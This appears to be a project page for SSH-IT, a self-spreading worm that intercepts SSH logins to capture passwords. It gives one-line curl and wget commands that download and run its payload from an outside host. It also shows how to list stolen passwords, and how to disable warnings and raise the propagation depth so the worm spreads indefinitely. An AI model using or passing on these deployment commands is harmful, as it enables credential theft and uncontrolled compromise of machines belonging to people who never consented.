---
layout: default
---

Use either one of these commands to deploy:
```shell
bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```
```shell
bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
```

{:refdef: style="text-align: center;"}
![Deploy-Example](deploy-example2.png)
{: refdef}

To show all captured passwords use:
```
~/.prng/thc_ctl -r list
```
{:refdef: style="text-align: center;"}
![Deploy-Example](list-example.png)
{: refdef}


To uninstall use:
```
~/.prng/thc_ctl -r uninstall
```

### ALPHA TESTING

This is ALPHA STAGE. DO NOT SHARE.
If you know about this then consider yourself special. Join us on [Telegram](https://t.me/thcorg).

ALPHA DEFAULT SETTINGS:
* ```THC_VERBOSE=1``` You will see a warning when *ssh* is being intercepted.
* ```THC_DEPTH=2``` The worm will stop spreading 2 hops from the host where it got deployed.

{:refdef: style="text-align: center;"}
![Deploy-Example](verbose-example.png)
{: refdef}

Take off all safety and run SSH-IT in release mode (*with no warnings*):
```shell
THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```

Or go bonkers and let the worm run until the Internet runs out of hosts:
```shell
THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```

### Contact

Twitter: [https://twitter.com/hackerschoice](https://twitter.com/hackerschoice)  
Telegram: [https://t.me/thcorg](https://t.me/thcorg)  
Web: [https://www.thc.org](https://www.thc.org)  
Medium: [https://medium.com/@hackerschoice](https://medium.com/@hackerschoice)  
E-Mail: members@thc.org  


